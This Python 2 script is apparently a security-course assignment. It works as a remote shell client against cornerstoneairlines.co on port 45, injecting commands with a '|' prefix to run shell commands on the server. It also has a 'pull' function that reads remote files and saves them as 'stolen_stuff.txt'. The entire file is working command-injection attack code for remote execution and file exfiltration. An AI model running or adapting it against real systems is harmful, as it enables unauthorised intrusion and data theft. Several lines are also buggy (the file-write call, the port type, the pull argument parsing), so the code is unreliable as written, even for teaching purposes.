"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time
import os

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """



    inp = raw_input("/")
    dirs = []
    place = ""

    while inp != "exit":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)
        if inp != "exit":
            words = inp.split(" ")
            if (len(words) > 1) and (words[0] == "cd"):
                dir = words[1]
                dirs.append(words[1])
                inp = raw_input(dir + "/ ")
                for x in dirs:
                    place = place + x + "/"
                s.send("|" + inp + " " + place + "\n")
                time.sleep(2)
                data = s.recv(1024)
                print(data)
            elif len(dirs) > 0  and len(words) > 1:
                s.send("|" + words[0] + " " + place + words[1] + "\n")
                time.sleep(2)
                data = s.recv(1024)
                print(data)
            else:
                s.send("|" + inp + "\n")
                time.sleep(2)
                data = s.recv(1024)
                print(data)
        else:
            s.close()
            break
        if (len(dirs) > 0):
            inp = raw_input(place + " ")
        else:
            inp = raw_input("/ ")
        s.close()


if __name__ == '__main__':

    inp = raw_input(">" )

    while inp != "quit":
        if inp == "shell":
            execute_cmd(inp)
        elif inp == "help":
            print("shell - Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote path> <local path> - Download files")
            print("help - Shows this help menu ")
            print("quit - Quit the shell")
        elif inp == "pull":
            words = inp.split(" ")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("cornerstoneairlines.co", "45"))
            s.recv(1024)
            s.send("|cat" + words[1] + "\n")
            time.sleep(2)
            data = s.recv(1024)
            s.close()
            path = os.path.abspath(words[2])
            filename = "stolen_stuff.txt"
            with open(os.path.join(path, filename), "w") as t_file:
                t.file(data)
        else:
            break

        inp = raw_input(">" )
